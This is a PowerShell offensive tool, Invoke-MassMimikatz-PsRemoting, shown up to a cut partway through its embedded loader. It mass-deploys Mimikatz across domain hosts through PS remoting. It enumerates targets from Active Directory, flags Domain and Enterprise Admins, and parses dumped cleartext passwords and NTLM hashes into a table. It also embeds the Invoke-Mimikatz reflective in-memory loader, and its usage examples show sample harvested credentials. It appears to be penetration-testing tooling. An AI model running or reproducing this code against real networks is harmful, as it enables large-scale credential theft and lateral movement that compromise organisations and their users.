<#

Script mod author
    Scott Sutherland (@_nullbind), 2015 NetSPI

Description
    This script can be used to run mimikatz on multiple servers from both domain and non-domain systems using psremoting.  
    Since there is 8k limit its possible to pass invoke-mimikatz to the target systems without reflection.
    Features/credits:
     - Idea: rob, will, and carlos
	 - Input: Accepts host from pipeline (will's code)
	 - Input: Accepts host list from file (will's code)
	 - AutoTarget option will lookup domain computers from DC (carlos's code)
	 - Ability to filter by OS (scott's code)
	 - Ability to only target domain systems with WinRm installed (vai SPNs) (scott's code)
	 - Ability to limit number of hosts to run Mimikatz on (scott's code)
	 - More descriptive verbose error messages (scott's code)
	 - Ability to specify alternative credentials and connect from a non-domain system (carlos's code)
	 - Runs mimikatz on target system using Joseph's/Matt's/benjamin's code)
     - Parse mimiaktz output (will's code)
	 - Returns enumerated credentials in a datable which can be used in the pipeline (scott's code)
	 
Notes
    This is based on work done by rob fuller, Joseph Bialek, carlos perez, benjamin delpy, Matt Graeber, Chris campbell, and will schroeder.
    Returns data table object to pipeline with creds.
    Weee PowerShell.

Command Examples

    # Run command as current domain user.  Enumerate and target all domain systems, but only run mimikatz on 5 systems.
    Invoke-MassMimikatz-PsRemoting –Verbose –AutoTarget –MaxHost 5

    # Run command as current domain user.  Enumerate and target all domain systems, but only run mimikatz on 5 systems.  Also, filter for systems with wmi enabled that are running Server 2012.
    Invoke-MassMimikatz-PsRemoting –Verbose –AutoTarget –MaxHost 5 –OsFilter “2012” –WinRm

    # Run command as current domain user.  Enumerate and target all domain systems, but only run mimikatz on 5 systems.  Also, filter for systems with wmi enabled that are running Server 2012.  Also, specify systems from host file.
    Invoke-MassMimikatz-PsRemoting –Verbose –AutoTarget –MaxHost 5 –OsFilter “2012” –WinRm –HostList c:\temp\hosts.txt

    # Run command as current domain user.  Enumerate and target all domain systems, but only run mimikatz on 5 systems.  Also, filter for systems with wmi enabled (spn) that are running Server 2012.  Also, specify systems from host file.  Also, target single system as parameter.
    Invoke-MassMimikatz-PsRemoting –Verbose –AutoTarget –MaxHost 5 –OsFilter “2012” –WinRm –HostList c:\temp\hosts.txt –Hosts “10.2.3.9”

     # Run command from non-domain system using alternative credentials. Target 10.1.1.1.
    “10.1.1.1” | Invoke-MassMimikatz-PsRemoting –Verbose –Credential domain\user

    # Run command from non-domain system using alternative credentials.  Target 10.1.1.1, authenticate to the dc at 10.2.2.1 to determine if user is a da, and only pull passwords from one system.
    “10.1.1.1” | Invoke-MassMimikatz-PsRemoting –Verbose  –Credential domain\user –DomainController 10.2.2.1 –AutoTarget -MaxHosts 1

    # Run command from non-domain system using alternative credentials.  Enumerate and target all domain systems, but only run mimikatz on 5 systems.
    Invoke-MassMimikatz-PsRemoting –Verbose –AutoTarget –MaxHost 5 –DomainController 10.2.2.1 –Credential domain\user

    # Run command from non-domain system using alternative credentials.  Enumerate and target all domain systems, but only run mimikatz on 5 systems.  Then output output to csv.
    Invoke-MassMimikatz-PsRemoting –Verbose –AutoTarget –MaxHost 5 –DomainController 10.2.2.1 –Credential domain\user | Export-Csv c:\temp\domain-creds.csv  -NoTypeInformation 

Output Sample 1

    PS C:\> "10.1.1.1" | Invoke-MassMimikatz-PsRemoting -Verbose -Credential domain\user | ft -AutoSize
    VERBOSE: Getting list of Servers from provided hosts...
    VERBOSE: Found 1 servers that met search criteria.
    VERBOSE: Attempting to create 1 ps sessions...
    VERBOSE: Established Sessions: 1 of 1 - Processing server 1 of 1 - 10.1.1.1
    VERBOSE: Running reflected Mimikatz against 1 open ps sessions...
    VERBOSE: Removing ps sessions...

    Domain      Username      Password                         EnterpriseAdmin DomainAdmin
    ------      --------      --------                         --------------- -----------    
    test        administrator MyEAPassword!                    Unknown         Unknown    
    test.domain administrator MyEAPassword!                    Unknown         Unknown    
    test        myadmin       MyDAPAssword!                    Unknown         Unknown    
    test.domain myadmin       MyDAPAssword!                    Unknown         Unknown       

Output Sample 2

PS C:\> "10.1.1.1" |Invoke-MassMimikatz-PsRemoting -Verbose -Credential domain\user -DomainController 10.1.1.2 -AutoTarget | ft -AutoSize
    VERBOSE: Getting list of Servers from provided hosts...
    VERBOSE: Getting list of Servers from DC...
    VERBOSE: Getting list of Enterprise and Domain Admins...
    VERBOSE: Found 3 servers that met search criteria.
    VERBOSE: Attempting to create 3 ps sessions...
    VERBOSE: Established Sessions: 0 of 3 - Processing server 1 of 3 - 10.1.1.1
    VERBOSE: Established Sessions: 1 of 3 - Processing server 2 of 3 - server1.domain.com
    VERBOSE: Established Sessions: 1 of 3 - Processing server 3 of 3 - server2.domain.com
    VERBOSE: Running reflected Mimikatz against 1 open ps sessions...
    VERBOSE: Removing ps sessions...

    Domain      Username      Password                         EnterpriseAdmin DomainAdmin
    ------      --------      --------                         --------------- -----------    
    test        administrator MyEAPassword!                    Yes             Yes    
    test.domain administrator MyEAPassword!                    Yes             Yes     
    test        myadmin       MyDAPAssword!                    No              Yes     
    test.domain myadmin       MyDAPAssword!                    No              Yes 
    test        myuser        MyUserPAssword!                  No              No
    test.domain myuser        MyUSerPAssword!                  No              No                


Todo
    fix parsing so password hashes show up differently.
    prettify
    help updates

References
	pending

#>
function Invoke-MassMimikatz-PsRemoting
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="Credentials to use when connecting to a Domain Controller.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        HelpMessage="Domain controller for Domain and Site that you want to query against.")]
        [string]$DomainController,

        [Parameter(Mandatory=$false,
        HelpMessage="This limits how many servers to run mimikatz on.")]
        [int]$MaxHosts = 5,

        [Parameter(Position=0,ValueFromPipeline=$true,
        HelpMessage="This can be use to provide a list of host.")]
        [String[]]
        $Hosts,

        [Parameter(Mandatory=$false,
        HelpMessage="This should be a path to a file containing a host list.  Once per line")]
        [String]
        $HostList,

        [Parameter(Mandatory=$false,
        HelpMessage="Limit results by the provided operating system. Default is all.  Only used with -autotarget.")]
        [string]$OsFilter = "*",

        [Parameter(Mandatory=$false,
        HelpMessage="Limit results by only include servers with registered winrm services. Only used with -autotarget.")]
        [switch]$WinRM,

        [Parameter(Mandatory=$false,
        HelpMessage="This get a list of computer from ADS withthe applied filters.")]
        [switch]$AutoTarget,

        [Parameter(Mandatory=$false,
        HelpMessage="Set the url to download invoke-mimikatz.ps1 from.  The default is the github repo.")]
        [string]$PsUrl = "https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1",

        [Parameter(Mandatory=$false,
        HelpMessage="Maximum number of Objects to pull from AD, limit is 1,000 .")]
        [int]$Limit = 1000,

        [Parameter(Mandatory=$false,
        HelpMessage="scope of a search as either a base, one-level, or subtree search, default is subtree.")]
        [ValidateSet("Subtree","OneLevel","Base")]
        [string]$SearchScope = "Subtree",

        [Parameter(Mandatory=$false,
        HelpMessage="Distinguished Name Path to limit search to.")]

        [string]$SearchDN
    )

        # Setup initial authentication, adsi, and functions
        Begin
        {
            if ($DomainController -and $Credential.GetNetworkCredential().Password)
            {
                $objDomain = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)", $Credential.UserName,$Credential.GetNetworkCredential().Password
                $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
            }
            else
            {
                $objDomain = [ADSI]""  
                $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
            }


            # ----------------------------------------
            # Setup required data tables
            # ----------------------------------------

            # Create data table to house results to return
            $TblPasswordList = New-Object System.Data.DataTable 
            $TblPasswordList.Columns.Add("Type") | Out-Null
            $TblPasswordList.Columns.Add("Domain") | Out-Null
            $TblPasswordList.Columns.Add("Username") | Out-Null
            $TblPasswordList.Columns.Add("Password") | Out-Null  
            $TblPasswordList.Columns.Add("EnterpriseAdmin") | Out-Null  
            $TblPasswordList.Columns.Add("DomainAdmin") | Out-Null  
            $TblPasswordList.Clear()

             # Create data table to house results
            $TblServers = New-Object System.Data.DataTable 
            $TblServers.Columns.Add("ComputerName") | Out-Null


            # ----------------------------------------
            # Function to grab domain computers
            # ----------------------------------------
            function Get-DomainComputers
            {
                [CmdletBinding()]
                Param(
                    [Parameter(Mandatory=$false,
                    HelpMessage="Credentials to use when connecting to a Domain Controller.")]
                    [System.Management.Automation.PSCredential]
                    [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
                    [Parameter(Mandatory=$false,
                    HelpMessage="Domain controller for Domain and Site that you want to query against.")]
                    [string]$DomainController,

                    [Parameter(Mandatory=$false,
                    HelpMessage="Limit results by the provided operating system. Default is all.")]
                    [string]$OsFilter = "*",

                    [Parameter(Mandatory=$false,
                    HelpMessage="Limit results by only include servers with registered winrm services.")]
                    [switch]$WinRM,

                    [Parameter(Mandatory=$false,
                    HelpMessage="Maximum number of Objects to pull from AD, limit is 1,000 .")]
                    [int]$Limit = 1000,

                    [Parameter(Mandatory=$false,
                    HelpMessage="scope of a search as either a base, one-level, or subtree search, default is subtree.")]
                    [ValidateSet("Subtree","OneLevel","Base")]
                    [string]$SearchScope = "Subtree",

                    [Parameter(Mandatory=$false,
                    HelpMessage="Distinguished Name Path to limit search to.")]

                    [string]$SearchDN
                )

                Write-verbose "Getting list of Servers from DC..."

                # Get domain computers from dc 
                if ($OsFilter -eq "*"){
                    $OsCompFilter = "(operatingsystem=*)"
                }else{
                    $OsCompFilter = "(operatingsystem=*$OsFilter*)"
                }

                # Select winrm spns if flagged
                if($WinRM){
                    $winrmComFilter = "(servicePrincipalName=*WSMAN*)"
                }else{
                    $winrmComFilter = ""
                }

                $CompFilter = "(&(objectCategory=Computer)$winrmComFilter $OsCompFilter)"        
                $ObjSearcher.PageSize = $Limit
                $ObjSearcher.Filter = $CompFilter
                $ObjSearcher.SearchScope = "Subtree"

                if ($SearchDN)
                {
                    $objSearcher.SearchDN = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$($SearchDN)")         
                }

                $ObjSearcher.FindAll() | ForEach-Object {
            
                    #add server to data table
                    $ComputerName = [string]$_.properties.dnshostname                    
                    $TblServers.Rows.Add($ComputerName) | Out-Null 
                }
            }

            # ----------------------------------------
            # Function to check group membership 
            # ----------------------------------------        
            function Get-GroupMember
            {
                [CmdletBinding()]
                Param(
                    [Parameter(Mandatory=$false,
                    HelpMessage="Credentials to use when connecting to a Domain Controller.")]
                    [System.Management.Automation.PSCredential]
                    [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
                    [Parameter(Mandatory=$false,
                    HelpMessage="Domain controller for Domain and Site that you want to query against.")]
                    [string]$DomainController,

                    [Parameter(Mandatory=$false,
                    HelpMessage="Maximum number of Objects to pull from AD, limit is 1,000 .")]
                    [string]$Group = "Domain Admins",

                    [Parameter(Mandatory=$false,
                    HelpMessage="Maximum number of Objects to pull from AD, limit is 1,000 .")]
                    [int]$Limit = 1000,

                    [Parameter(Mandatory=$false,
                    HelpMessage="scope of a search as either a base, one-level, or subtree search, default is subtree.")]
                    [ValidateSet("Subtree","OneLevel","Base")]
                    [string]$SearchScope = "Subtree",

                    [Parameter(Mandatory=$false,
                    HelpMessage="Distinguished Name Path to limit search to.")]
                    [string]$SearchDN
                )
  
                if ($DomainController -and $Credential.GetNetworkCredential().Password)
                   {
                        $root = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)", $Credential.UserName,$Credential.GetNetworkCredential().Password
                        $rootdn = $root | select distinguishedName -ExpandProperty distinguishedName
                        $objDomain = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)/CN=$Group, CN=Users,$rootdn" , $Credential.UserName,$Credential.GetNetworkCredential().Password
                        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
                    }
                    else
                    {
                        $root = ([ADSI]"").distinguishedName
                        $objDomain = [ADSI]("LDAP://CN=$Group, CN=Users," + $root)  
                        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
                    }
        
                    # Create data table to house results to return
                    $TblMembers = New-Object System.Data.DataTable 
                    $TblMembers.Columns.Add("GroupMember") | Out-Null 
                    $TblMembers.Clear()

                    $objDomain.member | %{                    
                        $TblMembers.Rows.Add($_.split("=")[1].split(",")[0]) | Out-Null 
                }

                return $TblMembers
            }

            # ----------------------------------------
            # Mimikatz parse function (Will Schoeder's) 
            # ----------------------------------------

            # This is a *very slightly mod version of will schroeder's function from:
            # https://raw.githubusercontent.com/Veil-Framework/PowerTools/master/PewPewPew/Invoke-MassMimikatz.ps1
            function Parse-Mimikatz {

                [CmdletBinding()]
                param(
                    [string]$raw
                )
    
                # Create data table to house results
                $TblPasswords = New-Object System.Data.DataTable 
                $TblPasswords.Columns.Add("PwType") | Out-Null
                $TblPasswords.Columns.Add("Domain") | Out-Null
                $TblPasswords.Columns.Add("Username") | Out-Null
                $TblPasswords.Columns.Add("Password") | Out-Null    

                # msv
	            $results = $raw | Select-String -Pattern "(?s)(?<=msv :).*?(?=tspkg :)" -AllMatches | %{$_.matches} | %{$_.value}
                if($results){
                    foreach($match in $results){
                        if($match.Contains("Domain")){
                            $lines = $match.split("`n")
                            foreach($line in $lines){
                                if ($line.Contains("Username")){
                                    $username = $line.split(":")[1].trim()
                                }
                                elseif ($line.Contains("Domain")){
                                    $domain = $line.split(":")[1].trim()
                                }
                                elseif ($line.Contains("NTLM")){
                                    $password = $line.split(":")[1].trim()
                                }
                            }
                            if ($password -and $($password -ne "(null)")){
                                #$username+"/"+$domain+":"+$password
                                $Pwtype = "msv"
                                $TblPasswords.Rows.Add($Pwtype,$domain,$username,$password) | Out-Null 
                            }
                        }
                    }
                }
                $results = $raw | Select-String -Pattern "(?s)(?<=tspkg :).*?(?=wdigest :)" -AllMatches | %{$_.matches} | %{$_.value}
                if($results){
                    foreach($match in $results){
                        if($match.Contains("Domain")){
                            $lines = $match.split("`n")
                            foreach($line in $lines){
                                if ($line.Contains("Username")){
                                    $username = $line.split(":")[1].trim()
                                }
                                elseif ($line.Contains("Domain")){
                                    $domain = $line.split(":")[1].trim()
                                }
                                elseif ($line.Contains("Password")){
                                    $password = $line.split(":")[1].trim()
                                }
                            }
                            if ($password -and $($password -ne "(null)")){
                                #$username+"/"+$domain+":"+$password
                                $Pwtype = "wdigest/tspkg"
                                $TblPasswords.Rows.Add($Pwtype,$domain,$username,$password) | Out-Null
                            }
                        }
                    }
                }
                $results = $raw | Select-String -Pattern "(?s)(?<=wdigest :).*?(?=kerberos :)" -AllMatches | %{$_.matches} | %{$_.value}
                if($results){
                    foreach($match in $results){
                        if($match.Contains("Domain")){
                            $lines = $match.split("`n")
                            foreach($line in $lines){
                                if ($line.Contains("Username")){
                                    $username = $line.split(":")[1].trim()
                                }
                                elseif ($line.Contains("Domain")){
                                    $domain = $line.split(":")[1].trim()
                                }
                                elseif ($line.Contains("Password")){
                                    $password = $line.split(":")[1].trim()
                                }
                            }
                            if ($password -and $($password -ne "(null)")){
                                #$username+"/"+$domain+":"+$password
                                $Pwtype = "wdigest/kerberos"
                                $TblPasswords.Rows.Add($Pwtype,$domain,$username,$password) | Out-Null
                            }
                        }
                    }
                }
                $results = $raw | Select-String -Pattern "(?s)(?<=kerberos :).*?(?=ssp :)" -AllMatches | %{$_.matches} | %{$_.value}
                if($results){
                    foreach($match in $results){
                        if($match.Contains("Domain")){
                            $lines = $match.split("`n")
                            foreach($line in $lines){
                                if ($line.Contains("Username")){
                                    $username = $line.split(":")[1].trim()
                                }
                                elseif ($line.Contains("Domain")){
                                    $domain = $line.split(":")[1].trim()
                                }
                                elseif ($line.Contains("Password")){
                                    $password = $line.split(":")[1].trim()
                                }
                            }
                            if ($password -and $($password -ne "(null)")){
                                #$username+"/"+$domain+":"+$password
                                $Pwtype = "kerberos/ssp"
                                $TblPasswords.Rows.Add($PWtype,$domain,$username,$password) | Out-Null
                            }
                        }
                    }
                }

                # Remove the computer accounts
                $TblPasswords_Clean = $TblPasswords | Where-Object { $_.username -notlike "*$"}

                return $TblPasswords_Clean
            }

            # ----------------------------------------
            # original invoke-mimikatz
            # ----------------------------------------
[string]$HostedScript = 
@'
function Invoke-Mimikatz
{
<#
.SYNOPSIS

This script leverages Mimikatz 2.0 and Invoke-ReflectivePEInjection to reflectively load Mimikatz completely in memory. This allows you to do things such as
dump credentials without ever writing the mimikatz binary to disk. 
The script has a ComputerName parameter which allows it to be executed against multiple computers.

This script should be able to dump credentials from any version of Windows through Windows 8.1 that has PowerShell v2 or higher installed.

Function: Invoke-Mimikatz
Author: Joe Bialek, Twitter: @JosephBialek
Mimikatz Author: Benjamin DELPY `gentilkiwi`. Blog: http://blog.gentilkiwi.com. Email: benjamin@gentilkiwi.com. Twitter @gentilkiwi
License:  http://creativecommons.org/licenses/by/3.0/fr/
Required Dependencies: Mimikatz (included)
Optional Dependencies: None
Version: 1.5
ReflectivePEInjection version: 1.1
Mimikatz version: 2.0 alpha (2/16/2015)

.DESCRIPTION

Reflectively loads Mimikatz 2.0 in memory using PowerShell. Can be used to dump credentials without writing anything to disk. Can be used for any 
functionality provided with Mimikatz.

.PARAMETER DumpCreds

Switch: Use mimikatz to dump credentials out of LSASS.

.PARAMETER DumpCerts

Switch: Use mimikatz to export all private certificates (even if they are marked non-exportable).

.PARAMETER Command

Supply mimikatz a custom command line. This works exactly the same as running the mimikatz executable like this: mimikatz "privilege::debug exit" as an example.

.PARAMETER ComputerName

Optional, an array of computernames to run the script on.
	
.EXAMPLE

Execute mimikatz on the local computer to dump certificates.
Invoke-Mimikatz -DumpCerts

.EXAMPLE

Execute mimikatz on two remote computers to dump credentials.
Invoke-Mimikatz -DumpCreds -ComputerName @("computer1", "computer2")

.EXAMPLE

Execute mimikatz on a remote computer with the custom command "privilege::debug exit" which simply requests debug privilege and exits
Invoke-Mimikatz -Command "privilege::debug exit" -ComputerName "computer1"

.NOTES
This script was created by combining the Invoke-ReflectivePEInjection script written by Joe Bialek and the Mimikatz code written by Benjamin DELPY
Find Invoke-ReflectivePEInjection at: https://github.com/clymb3r/PowerShell/tree/master/Invoke-ReflectivePEInjection
Find mimikatz at: http://blog.gentilkiwi.com

.LINK

Blog: http://clymb3r.wordpress.com/
Benjamin DELPY blog: http://blog.gentilkiwi.com

Github repo: https://github.com/clymb3r/PowerShell
mimikatz Github repo: https://github.com/gentilkiwi/mimikatz

Blog on reflective loading: http://clymb3r.wordpress.com/2013/04/06/reflective-dll-injection-with-powershell/
Blog on modifying mimikatz for reflective loading: http://clymb3r.wordpress.com/2013/04/09/modifying-mimikatz-to-be-loaded-using-invoke-reflectivedllinjection-ps1/

#>

[CmdletBinding(DefaultParameterSetName="DumpCreds")]
Param(
	[Parameter(Position = 0)]
	[String[]]
	$ComputerName,

    [Parameter(ParameterSetName = "DumpCreds", Position = 1)]
    [Switch]
    $DumpCreds,

    [Parameter(ParameterSetName = "DumpCerts", Position = 1)]
    [Switch]
    $DumpCerts,

    [Parameter(ParameterSetName = "CustomCommand", Position = 1)]
    [String]
    $Command
)

Set-StrictMode -Version 2


$RemoteScriptBlock = {
	[CmdletBinding()]
	Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[String]
		$PEBytes64,

        [Parameter(Position = 1, Mandatory = $true)]
		[String]
		$PEBytes32,
		
		[Parameter(Position = 2, Mandatory = $false)]
		[String]
		$FuncReturnType,
				
		[Parameter(Position = 3, Mandatory = $false)]
		[Int32]
		$ProcId,
		
		[Parameter(Position = 4, Mandatory = $false)]
		[String]
		$ProcName,

        [Parameter(Position = 5, Mandatory = $false)]
        [String]
        $ExeArgs
	)
	
	###################################
	##########  Win32 Stuff  ##########
	###################################
	Function Get-Win32Types
	{
		$Win32Types = New-Object System.Object

		#Define all the structures/enums that will be used
		#	This article shows you how to do this with reflection: http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html
		$Domain = [AppDomain]::CurrentDomain
		$DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')
		$AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
		$ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)
		$ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]


		############    ENUM    ############
		#Enum MachineType
		$TypeBuilder = $ModuleBuilder.DefineEnum('MachineType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('Native', [UInt16] 0) | Out-Null
		$TypeBuilder.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null
		$TypeBuilder.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null
		$TypeBuilder.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null
		$MachineType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name MachineType -Value $MachineType

		#Enum MagicType
		$TypeBuilder = $ModuleBuilder.DefineEnum('MagicType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null
		$MagicType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name MagicType -Value $MagicType

		#Enum SubSystemType
		$TypeBuilder = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null
		$SubSystemType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $SubSystemType

		#Enum DllCharacteristicsType
		$TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null
		$TypeBuilder.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null
		$TypeBuilder.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null
		$TypeBuilder.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null
		$TypeBuilder.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null
		$DllCharacteristicsType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $DllCharacteristicsType

		###########    STRUCT    ###########
		#Struct IMAGE_DATA_DIRECTORY
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DATA_DIRECTORY', $Attributes, [System.ValueType], 8)
		($TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null
		$IMAGE_DATA_DIRECTORY = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $IMAGE_DATA_DIRECTORY

		#Struct IMAGE_FILE_HEADER
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_FILE_HEADER', $Attributes, [System.ValueType], 20)
		$TypeBuilder.DefineField('Machine', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Characteristics', [UInt16], 'Public') | Out-Null
		$IMAGE_FILE_HEADER = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $IMAGE_FILE_HEADER

		#Struct IMAGE_OPTIONAL_HEADER64
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER64', $Attributes, [System.ValueType], 240)
		($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($TypeBuilder.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null
		($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
		($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null
		($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null
		($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null
